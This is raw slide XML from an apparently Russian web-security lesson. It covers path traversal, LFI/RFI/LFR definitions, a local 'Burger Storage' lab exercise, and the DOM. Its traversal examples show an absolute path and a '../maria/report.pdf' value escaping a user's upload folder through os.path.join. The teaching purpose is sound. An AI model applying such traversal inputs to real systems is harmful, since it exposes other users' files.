              <a:t>chmod </a:t>
            </a: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C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>600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F700D81-C502-D358-3C65-CE270C406133}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10839450" y="4472879"/>
            <a:ext cx="11049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Inter"/>
              </a:rPr>
              <a:t>права на ключ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13785952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CEE3C991-CEDD-4E76-94E7-DDE2FF884639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Path Traversal: абсолютный путь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82E8CC3-A88C-46B8-B265-99A18EF46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17" name="v7-text-293">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5CED37E-5EAA-4959-A4BE-7169980AC30E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3409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Результат join</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="v7-text-294">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{866C01B9-11BC-4E71-9B55-2BDEDA94FFD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2762250"/>
            <a:ext cx="34099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/srv/reports/report.pdf</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="v7-text-295">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{39440B99-8D39-4265-9631-7C9CAB5AC0DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="4000500"/>
            <a:ext cx="34099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Абсолютный name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заменил base.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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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Путь оказался вне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каталога alex.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="editable-code-39-7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC6E7CDF-CE79-471B-8FDC-CB03F0F3C7AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685799" y="2957512"/>
            <a:ext cx="4690341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base = </a:t>
            </a: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"/srv/uploads/alex"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name = </a:t>
            </a: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"/srv/reports/report.pdf"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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="9CDCFE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os</a:t>
            </a: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.path.join</a:t>
            </a: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base, name</a:t>
            </a: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CDA0CD-C0AA-D0D0-50C2-78B988369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4148137"/>
            <a:ext cx="5561420" cy="4165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1AA2F7A-A047-4B52-94B5-D07F123507F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685799" y="1174254"/>
            <a:ext cx="93804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ru-RU" sz="2100" b="0" i="0" kern="1200" spc="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="EEF2F6"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
                <a:ea typeface="DejaVu Sans"/>
                <a:cs typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="2100" b="0" i="0" kern="1200" spc="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="EEF2F6"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
                <a:ea typeface="DejaVu Sans"/>
                <a:cs typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="2100" b="0" i="0" kern="1200" spc="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="EEF2F6"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
                <a:ea typeface="DejaVu Sans"/>
                <a:cs typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Traversal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="2100" b="0" i="0" kern="1200" spc="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="EEF2F6"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
                <a:ea typeface="DejaVu Sans"/>
                <a:cs typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> - доступ к файлам за пределами разрешённого каталога через управляемый путь.</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="2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350227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5E049236-B6EB-450A-B0DE-6263C40015CA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Path Traversal: относительный путь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E823C2B-C42F-413D-A7E1-EBF00BF01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19" name="v7-text-287">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86E9AB07-AEE7-4B5A-8DB2-2371E03C7D41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8033497" y="2676525"/>
            <a:ext cx="3409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Полученный</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="195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путь</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="1950" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="v7-text-288">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{23D6401A-BFAB-480E-AC40-7F354ACD7A88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8033497" y="3214604"/>
            <a:ext cx="34099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72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/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1725" b="0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srv</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="172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/uploads/maria/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725" b="0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report.pdf</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="v7-text-289">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BABDF6C7-5B12-44D2-97E0-8272C3D99421}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="4000500"/>
            <a:ext cx="34099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«..» вывел путь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из каталога alex.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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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Чтение зависит</a:t>
            </a:r>
          </a:p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от прав процесса.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="editable-code-38-3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F6E7DFE2-68E7-4AB6-8821-EFE2E60A6872}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2956474"/>
            <a:ext cx="4455262" cy="17068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base = </a:t>
            </a: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"/srv/uploads/alex"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name = </a:t>
            </a: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"../maria/report.pdf"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPts val="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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="9CDCFE"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="Consolas"/>
              <a:ea typeface="Consolas"/>
              <a:cs typeface="Consola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path = </a:t>
            </a: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os</a:t>
            </a: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.path.normpath</a:t>
            </a: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    </a:t>
            </a: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os</a:t>
            </a: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.path.join</a:t>
            </a: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(</a:t>
            </a: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base, name</a:t>
            </a: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DA70D6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onsolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>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6B5553-21AB-A72E-8A81-30677382F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22" y="4524376"/>
            <a:ext cx="6669584" cy="46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5215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5E8DE047-E046-455A-B7C5-F6F0E916DB13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</a:rPr>
              <a:t>LFI, RFI и LFR: </a:t>
            </a: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</a:rPr>
              <a:t>уязвимости включения и чтения файлов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31E41F7-7F87-427F-A94C-BC1889DDC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3C8BF25-608A-AEC6-A743-65A191455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371600"/>
            <a:ext cx="3543300" cy="53149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35ABAED-9F5C-7320-1E31-3424549888F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="697035" y="152994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Inter"/>
              </a:rPr>
              <a:t>LFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C97070"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(Local File Inclusion)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Inter"/>
              </a:rPr>
              <a:t>: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Inter"/>
              </a:rPr>
              <a:t>локальный файл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D785D68-2CEB-6313-AA71-FF17AF35DF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125" y="1371600"/>
            <a:ext cx="3533775" cy="531495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6764025-0CD8-6C25-349B-ADB570AF97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2925" y="1371600"/>
            <a:ext cx="3543300" cy="531495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E6B2562-D038-6CA4-CA57-EA28EAFF7BB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4429125" y="151667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Inter"/>
              </a:rPr>
              <a:t>RFI(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C97070"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Remote File Inclusion)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Inter"/>
              </a:rPr>
              <a:t>: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Inter"/>
              </a:rPr>
              <a:t>удалённый ресурс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CE59FF-F566-DA27-B5DF-B8187ED4DC2A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="150495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Inter"/>
              </a:rPr>
              <a:t>LFR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Inter"/>
              </a:rPr>
              <a:t>(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Inter"/>
              </a:rPr>
              <a:t>L</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C97070"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ocal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C97070"/>
                </a:solidFill>
              </a:rPr>
              <a:t> File Read</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C97070"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)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Inter"/>
              </a:rPr>
              <a:t>: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Inter"/>
              </a:rPr>
              <a:t>чтение файлов</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25112688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AB2879F5-3017-4A3D-AEF6-A02494C79B41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Burger Storage: задание</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Рисунок 13" descr="Скриншот выполнения из writeup_for_web.pptx, объединённый с карточкой задания.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BCD0952B-78D3-4995-A7F2-B4A84836A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266825" y="2341169"/>
            <a:ext cx="6000750" cy="3118638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="v2-text-32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC2EE835-749B-467A-83D6-4CE92E8019EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="1857375"/>
            <a:ext cx="308610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Проверить границы своего файлового хранилища</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v2-text-33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F20D1E9-0116-469C-AA29-9AB9D85900F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="4343400"/>
            <a:ext cx="3086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C97070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Совместная практика</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v2-text-34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D79EAF5-E354-40DE-AAB0-41096C5D919D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="5267325"/>
            <a:ext cx="3086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A9B7C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A9B7C6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas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A9B7C6"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>127.0.0.1:8085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3A1AE02-20F0-43D2-AD4E-158EFF58D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0343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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Burger Storage: шаг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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-37-8" descr="Path Traversal, шаг 2. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9B1E3D4-7050-69D0-F14D-A561457D6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525" y="1581150"/>
            <a:ext cx="661495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1869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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Burger Storage: шаг 2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F9C1B7-EF20-48AF-9312-609D57FD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5C0FF9-7BFB-9857-29C7-48F8B6DA8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557" y="2182302"/>
            <a:ext cx="8711868" cy="341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95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E6E42B0B-D725-4E05-A87E-8D3515B03DF5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Страница: данные и JavaScript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F7D7912F-BFAD-4C1D-915E-726C6712402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Страница должна показывать данные пользователя и реагировать на его действия: выводить результаты поиска, комментарии и уведомления.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="server-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{101A6608-DFB4-41F3-960E-8D6E7D3F92D0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HTML от сервера</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="server-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{41C075A9-04A6-4EA2-9FBA-DDFFA7D592E7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49530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Обработчик получает данные, подставляет их в шаблон и отправляет готовую страницу браузеру.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="browser-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9AF8B76-5E94-4745-BD3E-96135418FD55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2819400"/>
            <a:ext cx="506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Обновление в браузере</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="browser-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FD63A94-26F7-4007-80BE-028E79D0E0DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="3409950"/>
            <a:ext cx="50673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JavaScript получает значение из формы или API и меняет нужные элементы DOM без полной перезагрузки страницы.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D222BF9-5452-48EB-B931-A8EF7A45F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8136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3DC7D3F4-D9A2-40B4-9021-F3760A77C3AB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8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DOM: что это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F4D625E-C980-416F-9884-023535FD6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3" name="v17-text-8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8BF89475-C2FA-45EC-B544-F8D04FD7FDB8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1390213"/>
            <a:ext cx="108204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8000"/>
              </a:lnSpc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Document Object Model — </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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объектная</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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модель</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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документа</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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в </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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памяти</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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браузера</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0"/>
              <a:t>DOM представляет HTML-страницу как дерево объектов и позволяет </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0" err="1"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0"/>
              <a:t> находить, изменять, добавлять и удалять элементы страницы, а также работать с их событиями.</a:t>
            </a:r>
            <a:endParaRPr sz="1800" b="0" dirty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531B619D-4D02-4193-9A07-1A15F489906D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>
            <a:off x="8434357" y="5707399"/>
            <a:ext cx="1284595" cy="378815"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23812">
            <a:solidFill>
              <a:srgbClr val="A87D7D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr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5BD014B2-E881-4E26-9BA6-E89D87F7286F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 flipH="1">
            <a:off x="7057087" y="5707399"/>
            <a:ext cx="1377270" cy="378815"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23812">
            <a:solidFill>
              <a:srgbClr val="A87D7D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr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F4998324-0B4A-4072-9E65-C691DE106D4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="28" idx="2"/>
            <a:endCxn id="30" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9525878" y="4850761"/>
            <a:ext cx="1124984" cy="521078"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23812">
            <a:solidFill>
              <a:srgbClr val="A87D7D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr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0BA7BD72-2F21-4163-993A-799397CA6708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 flipH="1">
            <a:off x="8434357" y="4850761"/>
            <a:ext cx="1091521" cy="521078"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23812">
            <a:solidFill>
              <a:srgbClr val="A87D7D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr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67FCBC3C-B00B-4EB9-82AE-32420C3757C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="26" idx="2"/>
            <a:endCxn id="28" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9525878" y="4136386"/>
            <a:ext cx="0" cy="378815"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23812">
            <a:solidFill>
              <a:srgbClr val="A87D7D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr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40F75AF4-0D7E-42A6-B704-EB1827237C3D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>
            <a:off x="6118501" y="4136386"/>
            <a:ext cx="0" cy="378815"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23812">
            <a:solidFill>
              <a:srgbClr val="A87D7D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr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DC9104CC-3677-4374-9574-A5FA9794CB5B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>
            <a:off x="7795923" y="3564274"/>
            <a:ext cx="1729955" cy="236552"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23812">
            <a:solidFill>
              <a:srgbClr val="A87D7D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr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5062D7BA-6E6E-44B6-B8F4-84F8130413EE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 flipH="1">
            <a:off x="6118501" y="3564274"/>
            <a:ext cx="1677422" cy="236552"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23812">
            <a:solidFill>
              <a:srgbClr val="A87D7D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr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A1BC9916-8660-4551-B6F4-0559FF82EDA6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>
            <a:off x="7795923" y="2849899"/>
            <a:ext cx="0" cy="378815"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23812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21" name="v17-text-16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FE9F0394-1129-4434-8501-7923B20F2B7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2523864"/>
            <a:ext cx="4495800" cy="3562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8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200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html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20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200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head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&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="200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title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20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…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200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title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&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="200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head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20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200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body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20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200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20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200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20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200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20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200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button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20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…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200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button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20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200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20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200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article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20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…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200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article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20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200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20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200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body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200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html</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0" dirty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3" name="v17-node-doc">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{99AFE1A1-DAA7-4AF1-8C62-2206EA196469}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6894904" y="2514339"/>
            <a:ext cx="1802037" cy="335560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19526">
            <a:solidFill>
              <a:srgbClr val="8D9BA5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6000"/>
              </a:lnSpc>
              <a:buNone/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document</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="v17-node-html">
            <a:extLst>
